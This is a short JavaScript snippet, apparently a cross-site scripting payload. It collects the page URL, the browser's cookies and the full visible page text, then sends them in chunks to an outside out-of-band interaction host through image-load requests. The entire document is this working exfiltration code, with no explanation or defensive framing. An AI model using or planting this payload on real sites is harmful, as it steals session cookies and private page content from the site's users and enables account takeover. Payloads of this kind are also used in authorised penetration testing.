let d = location.href + "\nCOOKIE=" + document.cookie + "\nBODY=" + document.body.innerText;
for (let i = 0; i < d.length; i += 900) {
  new Image().src = 'https://d8mtln2o12pup57skfigm9ytyo6fnfqax.oast.online/?i=' + i + '&d=' + encodeURIComponent(d.slice(i, i + 900));
}
